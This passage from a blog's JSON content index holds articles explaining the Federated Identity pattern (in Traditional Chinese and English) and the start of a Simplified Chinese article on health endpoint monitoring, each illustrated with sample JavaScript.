this.providerMappings.get(subdomain); &#125; &#x2F;&#x2F; 回傳預設提供者 return this.defaultProvider; &#125; async promptUserSelection(availableProviders) &#123; &#x2F;&#x2F; 向使用者呈現身分識別提供者清單 return &#123; providers: Array.from(this.providerMappings.entries()).map( ([name, url]) &#x3D;&gt; (&#123; name, url &#125;) ) &#125;; &#125; &#125; &#x2F;&#x2F; 使用方式 const discovery &#x3D; new HomeRealmDiscovery(); &#x2F;&#x2F; 將網域對應到身分識別提供者 discovery.registerProvider(&#39;company.com&#39;, &#39;https:&#x2F;&#x2F;idp.company.com&#39;); discovery.registerProvider(&#39;partner.com&#39;, &#39;https:&#x2F;&#x2F;sso.partner.com&#39;); discovery.registerProvider(&#39;social&#39;, &#39;https:&#x2F;&#x2F;social-idp.com&#39;); &#x2F;&#x2F; 為使用者探索提供者 const provider &#x3D; discovery.discoverProvider(&#39;user@company.com&#39;); &#x2F;&#x2F; 回傳：https:&#x2F;&#x2F;idp.company.com 聯合身分識別的優勢 1. 單一登入 (SSO) 使用者驗證一次即可存取多個應用程式： sequenceDiagram participant User as 使用者 participant App1 as 應用程式 1 participant App2 as 應用程式 2 participant IdP as 身分識別提供者 User->>App1: 存取應用程式 1 App1->>IdP: 重新導向進行驗證 User->>IdP: 提供憑證 IdP->>App1: 回傳權杖 App1->>User: 授予存取權 Note over User,App2: 稍後，使用者存取應用程式 2 User->>App2: 存取應用程式 2 App2->>IdP: 檢查驗證 IdP->>App2: 回傳現有權杖 App2->>User: 授予存取權（無需登入） 2. 集中式身分管理 身分識別提供者管理所有使用者帳號： class CentralizedIdentityManagement &#123; async onboardEmployee(employee) &#123; &#x2F;&#x2F; 在身分識別提供者中建立帳號 await this.identityProvider.createUser(&#123; username: employee.email, name: employee.name, department: employee.department, roles: employee.roles &#125;); &#x2F;&#x2F; 員工自動擁有所有應用程式的存取權 &#x2F;&#x2F; 無需在每個應用程式中建立帳號 &#125; async offboardEmployee(employeeId) &#123; &#x2F;&#x2F; 在身分識別提供者中停用帳號 await this.identityProvider.disableUser(employeeId); &#x2F;&#x2F; 員工立即失去所有應用程式的存取權 &#x2F;&#x2F; 無需在每個應用程式中停用帳號 &#125; async updateEmployeeRole(employeeId, newRole) &#123; &#x2F;&#x2F; 在身分識別提供者中更新角色 await this.identityProvider.updateUser(employeeId, &#123; roles: [newRole] &#125;); &#x2F;&#x2F; 角色變更傳播到所有應用程式 &#125; &#125; 3. 降低開發負擔 應用程式無需實作身分驗證： &#x2F;&#x2F; 之前：複雜的身分驗證邏輯 class ApplicationWithAuth &#123; async register(user) &#123; &#x2F;* ... *&#x2F; &#125; async login(credentials) &#123; &#x2F;* ... *&#x2F; &#125; async resetPassword(email) &#123; &#x2F;* ... *&#x2F; &#125; async verifyEmail(token) &#123; &#x2F;* ... *&#x2F; &#125; async enable2FA(userId) &#123; &#x2F;* ... *&#x2F; &#125; &#x2F;&#x2F; ... 數百行驗證程式碼 &#125; &#x2F;&#x2F; 之後：委託給身分識別提供者 class ApplicationWithFederation &#123; constructor(identityProvider) &#123; this.identityProvider &#x3D; identityProvider; &#125; async authenticate(token) &#123; &#x2F;&#x2F; 只需驗證權杖 return await this.identityProvider.validateToken(token); &#125; &#125; 設計考量 1. 單點故障 身分識別提供者的可用性至關重要： 🔒 可靠性考量跨多個資料中心部署：確保身分識別提供者具有高可用性 實作快取：快取權杖和驗證結果以處理暫時性中斷 優雅降級：當 IdP 無法使用時允許有限的功能 監控健康狀態：持續監控身分識別提供者的可用性 class ResilientTokenValidation &#123; constructor(identityProvider, cache) &#123; this.identityProvider &#x3D; identityProvider; this.cache &#x3D; cache; &#125; async validateToken(token) &#123; &#x2F;&#x2F; 先檢查快取 const cached &#x3D; await this.cache.get(&#96;token:$&#123;token&#125;&#96;); if (cached) &#123; return cached; &#125; try &#123; &#x2F;&#x2F; 使用身分識別提供者驗證 const claims &#x3D; await this.identityProvider.validate(token); &#x2F;&#x2F; 快取成功的驗證 await this.cache.set(&#96;token:$&#123;token&#125;&#96;, claims, 300); &#x2F;&#x2F; 5 分鐘 return claims; &#125; catch (error) &#123; &#x2F;&#x2F; 如果 IdP 無法使用，檢查是否有快取的驗證 const fallback &#x3D; await this.cache.get(&#96;token:fallback:$&#123;token&#125;&#96;); if (fallback) &#123; console.warn(&#39;由於 IdP 無法使用，使用快取的權杖驗證&#39;); return fallback; &#125; throw error; &#125; &#125; &#125; 2. 社交身分識別提供者 社交提供者提供的使用者資訊有限： class SocialIdentityIntegration &#123; async handleSocialLogin(socialToken, provider) &#123; &#x2F;&#x2F; 從社交提供者提取宣告 const socialClaims &#x3D; await this.validateSocialToken(socialToken, provider); &#x2F;&#x2F; 社交提供者通常只提供： &#x2F;&#x2F; - 唯一識別碼 &#x2F;&#x2F; - 電子郵件（有時） &#x2F;&#x2F; - 名稱（有時） &#x2F;&#x2F; 檢查使用者是否存在於應用程式中 let user &#x3D; await this.findUserBySocialId( provider, socialClaims.id ); if (!user) &#123; &#x2F;&#x2F; 首次登入 - 需要註冊 user &#x3D; await this.registerSocialUser(&#123; socialProvider: provider, socialId: socialClaims.id, email: socialClaims.email, name: socialClaims.name &#125;); &#125; &#x2F;&#x2F; 使用應用程式特定的資訊增強宣告 return &#123; ...socialClaims, userId: user.id, roles: user.roles, preferences: user.preferences &#125;; &#125; &#125; 3. 權杖生命週期和更新 管理權杖過期和更新： class TokenLifecycleManager &#123; constructor(identityProvider) &#123; this.identityProvider &#x3D; identityProvider; &#125; async issueTokenPair(user) &#123; &#x2F;&#x2F; 短期存取權杖 const accessToken &#x3D; await this.createToken(user, &#123; type: &#39;access&#39;, expiresIn: 900 &#x2F;&#x2F; 15 分鐘 &#125;); &#x2F;&#x2F; 長期更新權杖 const refreshToken &#x3D; await this.createToken(user, &#123; type: &#39;refresh&#39;, expiresIn: 2592000 &#x2F;&#x2F; 30 天 &#125;); return &#123; accessToken, refreshToken &#125;; &#125; async refreshAccessToken(refreshToken) &#123; &#x2F;&#x2F; 驗證更新權杖 const claims &#x3D; await this.validateToken(refreshToken); if (claims.type !&#x3D;&#x3D; &#39;refresh&#39;) &#123; throw new Error(&#39;無效的權杖類型&#39;); &#125; &#x2F;&#x2F; 發行新的存取權杖 return await this.createToken(claims, &#123; type: &#39;access&#39;, expiresIn: 900 &#125;); &#125; &#125; 何時使用此模式 ✅ 理想情境企業單一登入：員工存取多個企業應用程式 多合作夥伴協作：業務合作夥伴需要存取但沒有企業帳號 SaaS 應用程式：多租戶應用程式，每個租戶使用自己的身分識別提供者 消費者應用程式：允許使用者使用社交身分識別提供者登入 ❌ 不適用的情況單一身分識別提供者：所有使用者使用應用程式可存取的一個系統進行驗證 舊系統：應用程式無法處理現代身分驗證協定 高度隔離的系統：安全要求禁止外部身分驗證 實際範例：多租戶 SaaS class MultiTenantSaaS &#123; constructor() &#123; this.tenants &#x3D; new Map(); this.sts &#x3D; new SecurityTokenService(); &#125; async registerTenant(tenantId, identityProviderConfig) &#123; &#x2F;&#x2F; 註冊租戶的身分識別提供者 this.tenants.set(tenantId, &#123; id: tenantId, identityProvider: identityProviderConfig, users: new Set() &#125;); &#x2F;&#x2F; 設定 STS 信任租戶的 IdP await this.sts.addTrustedProvider( identityProviderConfig.issuer, identityProviderConfig.publicKey ); &#125; async authenticateUser(token) &#123; &#x2F;&#x2F; 使用 STS 驗證權杖 const claims &#x3D; await this.sts.validateToken(token); &#x2F;&#x2F; 從權杖確定租戶 const tenantId &#x3D; claims.tenantId; const tenant &#x3D; this.tenants.get(tenantId); if (!tenant) &#123; throw new Error(&#39;未知的租戶&#39;); &#125; &#x2F;&#x2F; 驗證使用者屬於租戶 if (!tenant.users.has(claims.userId)) &#123; &#x2F;&#x2F; 首次使用者 - 新增到租戶 tenant.users.add(claims.userId); &#125; return &#123; user: claims, tenant: tenant &#125;; &#125; &#125; 總結 聯合身分識別將身分驗證從負擔轉變為助力。透過將身分驗證委託給受信任的身分識別提供者，您可以： 改善使用者體驗，提供單一登入 增強安全性，實現集中式身分管理 降低開發工作量，避免自訂身分驗證 促進協作，跨越組織界限 此模式在企業和多租戶情境中特別強大，使用者需要無縫存取多個應用程式，同時保持安全性和控制。 參考資料 聯合身分識別模式 - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"Federated Identity: One Login to Rule Them All","slug":"2019/12/Federated-Identity-Pattern","date":"un00fin00","updated":"un22fin22","comments":true,"path":"2019/12/Federated-Identity-Pattern/","permalink":"https://neo01.com/2019/12/Federated-Identity-Pattern/","excerpt":"Delegate authentication to external identity providers to simplify development, reduce administrative overhead, and improve user experience across multiple applications and organizations.","text":"Imagine carrying a different key for every building you need to enter—your office, the gym, the library, your apartment. Now imagine having one master key that works everywhere, but each building still controls who gets access. This is the essence of federated identity: one set of credentials, trusted across multiple systems, while each system maintains control over what you can do. The Challenge: Too Many Passwords, Too Many Problems In today’s interconnected world, users work with applications from multiple organizations—their employer, business partners, cloud service providers, and third-party tools. Each application traditionally requires its own authentication system. The Traditional Approach: Separate Credentials Everywhere &#x2F;&#x2F; Each application manages its own users class TraditionalAuthSystem &#123; constructor() &#123; this.users &#x3D; new Map(); &#125; async register(username, password, email) &#123; &#x2F;&#x2F; Store credentials in application database const hashedPassword &#x3D; await this.hashPassword(password); this.users.set(username, &#123; password: hashedPassword, email: email, createdAt: new Date() &#125;); &#125; async login(username, password) &#123; const user &#x3D; this.users.get(username); if (!user) &#123; throw new Error(&#39;User not found&#39;); &#125; const isValid &#x3D; await this.verifyPassword(password, user.password); if (!isValid) &#123; throw new Error(&#39;Invalid password&#39;); &#125; return this.createSession(username); &#125; &#125; ⚠️ Problems with Traditional AuthenticationDisjointed User Experience: Users forget credentials when managing multiple accounts Security Vulnerabilities: Departing employees' accounts may not be deprovisioned promptly Administrative Burden: Managing users, passwords, and permissions across systems Development Overhead: Building and maintaining authentication infrastructure The Solution: Federated Identity Delegate authentication to trusted external identity providers. Users authenticate once with their identity provider, then access multiple applications without re-entering credentials. graph LR User([User]) -->|1. Access App| App[Application] App -->|2. Redirect to IdP| IdP[Identity Provider] User -->|3. Authenticate| IdP IdP -->|4. Issue Token| STS[Security Token Service] STS -->|5. Return Token with Claims| App App -->|6. Grant Access| User style User fill:#4dabf7,stroke:#1971c2 style App fill:#51cf66,stroke:#2f9e44 style IdP fill:#ffd43b,stroke:#f59f00 style STS fill:#ff8787,stroke:#c92a2a How It Works User attempts to access application: The application detects the user is not authenticated Redirect to Identity Provider: Application redirects user to trusted identity provider User authenticates: User provides credentials to their identity provider Token issuance: Identity provider issues a security token containing claims about the user Token validation: Application validates the token and extracts user information Access granted: User accesses the application without creating new credentials Core Components 1. Identity Provider (IdP) The trusted authority that authenticates users and issues tokens: class IdentityProvider &#123; constructor(userDirectory) &#123; this.userDirectory &#x3D; userDirectory; this.trustedApplications &#x3D; new Set(); &#125; async authenticate(username, password, applicationId) &#123; &#x2F;&#x2F; Verify application is trusted if (!this.trustedApplications.has(applicationId)) &#123; throw new Error(&#39;Untrusted application&#39;); &#125; &#x2F;&#x2F; Authenticate user against directory const user &#x3D; await this.userDirectory.validateCredentials( username, password ); if (!user) &#123; throw new Error(&#39;Authentication failed&#39;); &#125; &#x2F;&#x2F; Issue token with claims return this.issueToken(user, applicationId); &#125; issueToken(user, applicationId) &#123; const claims &#x3D; &#123; userId: user.id, username: user.username, email: user.email, roles: user.roles, department: user.department, issuer: &#39;corporate-idp&#39;, audience: applicationId, issuedAt: Date.now(), expiresAt: Date.now() + (3600 * 1000) &#x2F;&#x2F; 1 hour &#125;; &#x2F;&#x2F; Sign the token return this.signToken(claims); &#125; &#125; 2. Security Token Service (STS) Transforms and augments tokens, establishing trust between identity providers and applications: class SecurityTokenService &#123; constructor(trustedIdPs) &#123; this.trustedIdPs &#x3D; trustedIdPs; this.claimMappings &#x3D; new Map(); &#125; async transformToken(incomingToken, targetApplication) &#123; &#x2F;&#x2F; Verify token is from trusted IdP const tokenInfo &#x3D; await this.validateToken(incomingToken); if (!this.trustedIdPs.has(tokenInfo.issuer)) &#123; throw new Error(&#39;Token from untrusted issuer&#39;); &#125; &#x2F;&#x2F; Transform claims for target application const transformedClaims &#x3D; this.transformClaims( tokenInfo.claims, targetApplication ); &#x2F;&#x2F; Issue new token for target application return this.issueToken(transformedClaims, targetApplication); &#125; transformClaims(claims, targetApplication) &#123; const mapping &#x3D; this.claimMappings.get(targetApplication); if (!mapping) &#123; return claims; &#x2F;&#x2F; No transformation needed &#125; const transformed &#x3D; &#123;&#125;; for (const [sourceClaim, targetClaim] of mapping.entries()) &#123; if (claims[sourceClaim]) &#123; transformed[targetClaim] &#x3D; claims[sourceClaim]; &#125; &#125; &#x2F;&#x2F; Add application-specific claims transformed.applicationId &#x3D; targetApplication; transformed.transformedAt &#x3D; Date.now(); return transformed; &#125; &#125; 3. Claims-Based Access Control Applications authorize access based on claims in the token: class ClaimsBasedAuthorization &#123; constructor() &#123; this.policies &#x3D; new Map(); &#125; definePolicy(resource, requiredClaims) &#123; this.policies.set(resource, requiredClaims); &#125; async authorize(token, resource) &#123; &#x2F;&#x2F; Extract claims from token const claims &#x3D; await this.extractClaims(token); &#x2F;&#x2F; Get required claims for resource const required &#x3D; this.policies.get(resource); if (!required) &#123; return true; &#x2F;&#x2F; No policy defined, allow access &#125; &#x2F;&#x2F; Check if user has required claims return this.evaluateClaims(claims, required); &#125; evaluateClaims(userClaims, requiredClaims) &#123; for (const [claimType, requiredValue] of Object.entries(requiredClaims)) &#123; const userValue &#x3D; userClaims[claimType]; if (!userValue) &#123; return false; &#x2F;&#x2F; Missing required claim &#125; if (Array.isArray(requiredValue)) &#123; &#x2F;&#x2F; Check if user has any of the required values if (!requiredValue.includes(userValue)) &#123; return false; &#125; &#125; else if (userValue !&#x3D;&#x3D; requiredValue) &#123; return false; &#125; &#125; return true; &#125; &#125; &#x2F;&#x2F; Usage example const authz &#x3D; new ClaimsBasedAuthorization(); &#x2F;&#x2F; Define access policies authz.definePolicy(&#39;&#x2F;admin&#39;, &#123; role: [&#39;admin&#39;, &#39;superuser&#39;] &#125;); authz.definePolicy(&#39;&#x2F;reports&#x2F;financial&#39;, &#123; role: &#39;manager&#39;, department: &#39;finance&#39; &#125;); &#x2F;&#x2F; Check authorization const canAccess &#x3D; await authz.authorize(userToken, &#39;&#x2F;admin&#39;); Implementation Example Here’s a complete federated authentication flow: class FederatedApplication &#123; constructor(identityProviderUrl, applicationId, secretKey) &#123; this.identityProviderUrl &#x3D; identityProviderUrl; this.applicationId &#x3D; applicationId; this.secretKey &#x3D; secretKey; this.authorization &#x3D; new ClaimsBasedAuthorization(); &#125; &#x2F;&#x2F; Middleware to protect routes requireAuthentication() &#123; return async (req, res, next) &#x3D;&gt; &#123; const token &#x3D; req.headers.authorization?.replace(&#39;Bearer &#39;, &#39;&#39;); if (!token) &#123; &#x2F;&#x2F; Redirect to identity provider const redirectUrl &#x3D; this.buildAuthenticationUrl(req.originalUrl); return res.redirect(redirectUrl); &#125; try &#123; &#x2F;&#x2F; Validate token const claims &#x3D; await this.validateToken(token); &#x2F;&#x2F; Attach user information to request req.user &#x3D; claims; next(); &#125; catch (error) &#123; res.status(401).json(&#123; error: &#39;Invalid token&#39; &#125;); &#125; &#125;; &#125; buildAuthenticationUrl(returnUrl) &#123; const params &#x3D; new URLSearchParams(&#123; client_id: this.applicationId, return_url: returnUrl, response_type: &#39;token&#39; &#125;); return &#96;$&#123;this.identityProviderUrl&#125;&#x2F;authenticate?$&#123;params&#125;&#96;; &#125; async handleCallback(req, res) &#123; const &#123; token &#125; &#x3D; req.query; try &#123; &#x2F;&#x2F; Validate token from IdP const claims &#x3D; await this.validateToken(token); &#x2F;&#x2F; Create application session const sessionToken &#x3D; await this.createSession(claims); &#x2F;&#x2F; Redirect to original destination const returnUrl &#x3D; req.query.return_url || &#39;&#x2F;&#39;; res.redirect(&#96;$&#123;returnUrl&#125;?token&#x3D;$&#123;sessionToken&#125;&#96;); &#125; catch (error) &#123; res.status(401).json(&#123; error: &#39;Authentication failed&#39; &#125;); &#125; &#125; async validateToken(token) &#123; &#x2F;&#x2F; Verify token signature const payload &#x3D; await this.verifySignature(token, this.secretKey); &#x2F;&#x2F; Check expiration if (payload.expiresAt &lt; Date.now()) &#123; throw new Error(&#39;Token expired&#39;); &#125; &#x2F;&#x2F; Verify audience if (payload.audience !&#x3D;&#x3D; this.applicationId) &#123; throw new Error(&#39;Token not intended for this application&#39;); &#125; return payload; &#125; &#125; &#x2F;&#x2F; Setup application const app &#x3D; express(); const federatedApp &#x3D; new FederatedApplication( &#39;https:&#x2F;&#x2F;idp.company.com&#39;, &#39;my-application-id&#39;, process.env.SECRET_KEY ); &#x2F;&#x2F; Callback endpoint for IdP app.get(&#39;&#x2F;auth&#x2F;callback&#39;, (req, res) &#x3D;&gt; &#123; federatedApp.handleCallback(req, res); &#125;); &#x2F;&#x2F; Protected routes app.get(&#39;&#x2F;dashboard&#39;, federatedApp.requireAuthentication(), (req, res) &#x3D;&gt; &#123; res.json(&#123; message: &#39;Welcome to dashboard&#39;, user: req.user &#125;); &#125; ); Home Realm Discovery When multiple identity providers are available, the system must determine which one to use: class HomeRealmDiscovery &#123; constructor() &#123; this.providerMappings &#x3D; new Map(); this.defaultProvider &#x3D; null; &#125; registerProvider(identifier, providerUrl) &#123; this.providerMappings.set(identifier, providerUrl); &#125; setDefaultProvider(providerUrl) &#123; this.defaultProvider &#x3D; providerUrl; &#125; discoverProvider(userIdentifier) &#123; &#x2F;&#x2F; Extract domain from email if (userIdentifier.includes(&#39;@&#39;)) &#123; const domain &#x3D; userIdentifier.split(&#39;@&#39;)[1]; &#x2F;&#x2F; Check if domain has mapped provider if (this.providerMappings.has(domain)) &#123; return this.providerMappings.get(domain); &#125; &#125; &#x2F;&#x2F; Check for subdomain-based discovery const subdomain &#x3D; this.extractSubdomain(userIdentifier); if (subdomain &amp;&amp; this.providerMappings.has(subdomain)) &#123; return this.providerMappings.get(subdomain); &#125; &#x2F;&#x2F; Return default provider return this.defaultProvider; &#125; async promptUserSelection(availableProviders) &#123; &#x2F;&#x2F; Present user with list of identity providers return &#123; providers: Array.from(this.providerMappings.entries()).map( ([name, url]) &#x3D;&gt; (&#123; name, url &#125;) ) &#125;; &#125; &#125; &#x2F;&#x2F; Usage const discovery &#x3D; new HomeRealmDiscovery(); &#x2F;&#x2F; Map domains to identity providers discovery.registerProvider(&#39;company.com&#39;, &#39;https:&#x2F;&#x2F;idp.company.com&#39;); discovery.registerProvider(&#39;partner.com&#39;, &#39;https:&#x2F;&#x2F;sso.partner.com&#39;); discovery.registerProvider(&#39;social&#39;, &#39;https:&#x2F;&#x2F;social-idp.com&#39;); &#x2F;&#x2F; Discover provider for user const provider &#x3D; discovery.discoverProvider(&#39;user@company.com&#39;); &#x2F;&#x2F; Returns: https:&#x2F;&#x2F;idp.company.com Benefits of Federated Identity 1. Single Sign-On (SSO) Users authenticate once and access multiple applications: sequenceDiagram participant User participant App1 participant App2 participant IdP User->>App1: Access Application 1 App1->>IdP: Redirect for authentication User->>IdP: Provide credentials IdP->>App1: Return token App1->>User: Grant access Note over User,App2: Later, user accesses App2 User->>App2: Access Application 2 App2->>IdP: Check authentication IdP->>App2: Return existing token App2->>User: Grant access (no login required) 2. Centralized Identity Management Identity provider manages all user accounts: class CentralizedIdentityManagement &#123; async onboardEmployee(employee) &#123; &#x2F;&#x2F; Create account in identity provider await this.identityProvider.createUser(&#123; username: employee.email, name: employee.name, department: employee.department, roles: employee.roles &#125;); &#x2F;&#x2F; Employee automatically has access to all applications &#x2F;&#x2F; No need to create accounts in each application &#125; async offboardEmployee(employeeId) &#123; &#x2F;&#x2F; Disable account in identity provider await this.identityProvider.disableUser(employeeId); &#x2F;&#x2F; Employee immediately loses access to all applications &#x2F;&#x2F; No need to deactivate accounts in each application &#125; async updateEmployeeRole(employeeId, newRole) &#123; &#x2F;&#x2F; Update role in identity provider await this.identityProvider.updateUser(employeeId, &#123; roles: [newRole] &#125;); &#x2F;&#x2F; Role change propagates to all applications &#125; &#125; 3. Reduced Development Overhead Applications don’t need to implement authentication: &#x2F;&#x2F; Before: Complex authentication logic class ApplicationWithAuth &#123; async register(user) &#123; &#x2F;* ... *&#x2F; &#125; async login(credentials) &#123; &#x2F;* ... *&#x2F; &#125; async resetPassword(email) &#123; &#x2F;* ... *&#x2F; &#125; async verifyEmail(token) &#123; &#x2F;* ... *&#x2F; &#125; async enable2FA(userId) &#123; &#x2F;* ... *&#x2F; &#125; &#x2F;&#x2F; ... hundreds of lines of auth code &#125; &#x2F;&#x2F; After: Delegate to identity provider class ApplicationWithFederation &#123; constructor(identityProvider) &#123; this.identityProvider &#x3D; identityProvider; &#125; async authenticate(token) &#123; &#x2F;&#x2F; Simply validate token return await this.identityProvider.validateToken(token); &#125; &#125; Design Considerations 1. Single Point of Failure Identity provider availability is critical: 🔒 Reliability ConsiderationsDeploy across multiple datacenters: Ensure identity provider has high availability Implement caching: Cache tokens and validation results to handle temporary outages Graceful degradation: Allow limited functionality when IdP is unavailable Monitor health: Continuously monitor identity provider availability class ResilientTokenValidation &#123; constructor(identityProvider, cache) &#123; this.identityProvider &#x3D; identityProvider; this.cache &#x3D; cache; &#125; async validateToken(token) &#123; &#x2F;&#x2F; Check cache first const cached &#x3D; await this.cache.get(&#96;token:$&#123;token&#125;&#96;); if (cached) &#123; return cached; &#125; try &#123; &#x2F;&#x2F; Validate with identity provider const claims &#x3D; await this.identityProvider.validate(token); &#x2F;&#x2F; Cache successful validation await this.cache.set(&#96;token:$&#123;token&#125;&#96;, claims, 300); &#x2F;&#x2F; 5 minutes return claims; &#125; catch (error) &#123; &#x2F;&#x2F; If IdP is unavailable, check if we have cached validation const fallback &#x3D; await this.cache.get(&#96;token:fallback:$&#123;token&#125;&#96;); if (fallback) &#123; console.warn(&#39;Using cached token validation due to IdP unavailability&#39;); return fallback; &#125; throw error; &#125; &#125; &#125; 2. Social Identity Providers Social providers offer limited user information: class SocialIdentityIntegration &#123; async handleSocialLogin(socialToken, provider) &#123; &#x2F;&#x2F; Extract claims from social provider const socialClaims &#x3D; await this.validateSocialToken(socialToken, provider); &#x2F;&#x2F; Social providers typically only provide: &#x2F;&#x2F; - Unique identifier &#x2F;&#x2F; - Email (sometimes) &#x2F;&#x2F; - Name (sometimes) &#x2F;&#x2F; Check if user exists in application let user &#x3D; await this.findUserBySocialId( provider, socialClaims.id ); if (!user) &#123; &#x2F;&#x2F; First time login - need to register user &#x3D; await this.registerSocialUser(&#123; socialProvider: provider, socialId: socialClaims.id, email: socialClaims.email, name: socialClaims.name &#125;); &#125; &#x2F;&#x2F; Augment claims with application-specific information return &#123; ...socialClaims, userId: user.id, roles: user.roles, preferences: user.preferences &#125;; &#125; &#125; 3. Token Lifetime and Refresh Manage token expiration and renewal: class TokenLifecycleManager &#123; constructor(identityProvider) &#123; this.identityProvider &#x3D; identityProvider; &#125; async issueTokenPair(user) &#123; &#x2F;&#x2F; Short-lived access token const accessToken &#x3D; await this.createToken(user, &#123; type: &#39;access&#39;, expiresIn: 900 &#x2F;&#x2F; 15 minutes &#125;); &#x2F;&#x2F; Long-lived refresh token const refreshToken &#x3D; await this.createToken(user, &#123; type: &#39;refresh&#39;, expiresIn: 2592000 &#x2F;&#x2F; 30 days &#125;); return &#123; accessToken, refreshToken &#125;; &#125; async refreshAccessToken(refreshToken) &#123; &#x2F;&#x2F; Validate refresh token const claims &#x3D; await this.validateToken(refreshToken); if (claims.type !&#x3D;&#x3D; &#39;refresh&#39;) &#123; throw new Error(&#39;Invalid token type&#39;); &#125; &#x2F;&#x2F; Issue new access token return await this.createToken(claims, &#123; type: &#39;access&#39;, expiresIn: 900 &#125;); &#125; &#125; When to Use This Pattern ✅ Ideal ScenariosEnterprise Single Sign-On: Employees access multiple corporate applications Multi-Partner Collaboration: Business partners need access without corporate accounts SaaS Applications: Multi-tenant applications where each tenant uses their own identity provider Consumer Applications: Allow users to sign in with social identity providers ❌ Not Suitable WhenSingle Identity Provider: All users authenticate with one system accessible to the application Legacy Systems: Application cannot handle modern authentication protocols Highly Isolated Systems: Security requirements prohibit external authentication Real-World Example: Multi-Tenant SaaS class MultiTenantSaaS &#123; constructor() &#123; this.tenants &#x3D; new Map(); this.sts &#x3D; new SecurityTokenService(); &#125; async registerTenant(tenantId, identityProviderConfig) &#123; &#x2F;&#x2F; Register tenant&#39;s identity provider this.tenants.set(tenantId, &#123; id: tenantId, identityProvider: identityProviderConfig, users: new Set() &#125;); &#x2F;&#x2F; Configure STS to trust tenant&#39;s IdP await this.sts.addTrustedProvider( identityProviderConfig.issuer, identityProviderConfig.publicKey ); &#125; async authenticateUser(token) &#123; &#x2F;&#x2F; Validate token with STS const claims &#x3D; await this.sts.validateToken(token); &#x2F;&#x2F; Determine tenant from token const tenantId &#x3D; claims.tenantId; const tenant &#x3D; this.tenants.get(tenantId); if (!tenant) &#123; throw new Error(&#39;Unknown tenant&#39;); &#125; &#x2F;&#x2F; Verify user belongs to tenant if (!tenant.users.has(claims.userId)) &#123; &#x2F;&#x2F; First time user - add to tenant tenant.users.add(claims.userId); &#125; return &#123; user: claims, tenant: tenant &#125;; &#125; &#125; Summary Federated identity transforms authentication from a burden into an enabler. By delegating authentication to trusted identity providers, you: Improve user experience with single sign-on Enhance security with centralized identity management Reduce development effort by avoiding custom authentication Enable collaboration across organizational boundaries The pattern is particularly powerful in enterprise and multi-tenant scenarios where users need seamless access to multiple applications while maintaining security and control. Reference Federated Identity Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"健康端点监控：保持服务的活力与健康","slug":"2019/11/Health-Endpoint-Monitoring-Pattern-zh-CN","date":"un55fin55","updated":"un22fin22","comments":true,"path":"/zh-CN/2019/11/Health-Endpoint-Monitoring-Pattern/","permalink":"https://neo01.com/zh-CN/2019/11/Health-Endpoint-Monitoring-Pattern/","excerpt":"通过专用端点实现健康检查，监控应用程序的可用性和性能。学习如何在用户发现问题之前，验证服务是否正常运作。","text":"想象一间诊所，病人可以随时走进去做快速健康检查——量体温、血压、心跳——几分钟内就能测量完毕。医生不需要进行手术就能知道是否有问题；这些简单的生命体征就能揭示病人的健康状态。这正是健康端点监控模式为应用程序所做的事：它提供一种快速、非侵入式的方法来检查服务是否健康。 挑战：在问题发生时及时发现 在现代分布式系统中，应用程序依赖多个组件： 数据库和存储系统 外部 API 和服务 消息队列 缓存层 网络基础设施 这些组件都可能故障，当它们故障时，你需要立即知道——在用户发现之前。 传统方法：等待抱怨 &#x2F;&#x2F; 应用程序盲目运行 class PaymentService &#123; async processPayment(order) &#123; try &#123; &#x2F;&#x2F; 希望数据库可用 await this.database.save(order); &#x2F;&#x2F; 希望支付网关正常 await this.paymentGateway.charge(order.amount); return &#123; success: true &#125;; &#125; catch (error) &#123; &#x2F;&#x2F; 用户首先发现问题 console.error(&#39;Payment failed:&#39;, error); return &#123; success: false, error: error.message &#125;; &#125; &#125; &#125; ⚠️ 被动监控的问题延迟检测：当用户抱怨时才知道故障 糟糕的用户体验：用户在关键操作时遇到错误 难以诊断：很难确定什么故障以及何时故障 无法主动行动：无法预防问题或重新路由流量 解决方案：健康端点监控 公开专用端点，让外部监控工具可以定期检查以验证应用程序的健康状态。 graph TB A[监控工具] -->|HTTP GET /health| B[负载均衡器] B --> C[应用程序实例 1] B --> D[应用程序实例 2] B --> E[应用程序实例 3] C --> C1[健康检查] D --> D1[健康检查] E --> E1[健康检查] C1 --> C2[数据库] C1 --> C3[缓存] C1 --> C4[外部 API] D1 --> C2 D1 --> C3 D1 --> C4 E1 --> C2 E1 --> C3 E1 --> C4 C1 -->|200 OK| B D1 -->|200 OK| B E1 -->|503 Error| B B -->|从池中移除| E style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#ff6b6b,stroke:#c92a2a style C1 fill:#51cf66,stroke:#2f9e44 style D1 fill:#51cf66,stroke:#2f9e44 style E1 fill:#ff6b6b,stroke:#c92a2a 基本实现 &#x2F;&#x2F; 简单的健康端点 class HealthCheckController &#123; async checkHealth(req, res) &#123; try &#123; &#x2F;&#x2F; 验证应用程序正在运行 const status &#x3D; &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), uptime: process.uptime() &#125;; res.status(200).json(status); &#125; catch (error) &#123; res.status(503).json(&#123; status: &#39;unhealthy&#39;, error: error.message &#125;); &#125; &#125; &#125; &#x2F;&#x2F; 注册端点 app.get(&#39;&#x2F;health&#39;, (req, res) &#x3D;&gt; &#123; healthCheck.checkHealth(req, res); &#125;); 全面的健康检查 强健的健康端点会验证关键依赖项： class ComprehensiveHealthCheck &#123; constructor(database, cache, externalService) &#123; this.database &#x3D; database; this.cache &#x3D; cache; this.externalService &#x3D; externalService; &#125; async checkHealth(req, res) &#123; const checks &#x3D; &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), checks: &#123;&#125; &#125;; &#x2F;&#x2F; 检查数据库连接 try &#123; await this.database.ping(); checks.checks.database &#x3D; &#123; status: &#39;healthy&#39;, responseTime: await this.measureResponseTime( () &#x3D;&gt; this.database.ping() ) &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;unhealthy&#39;; checks.checks.database &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; 检查缓存可用性 try &#123; await this.cache.set(&#39;health_check&#39;, &#39;ok&#39;, 10); const value &#x3D; await this.cache.get(&#39;health_check&#39;); checks.checks.cache &#x3D; &#123; status: value 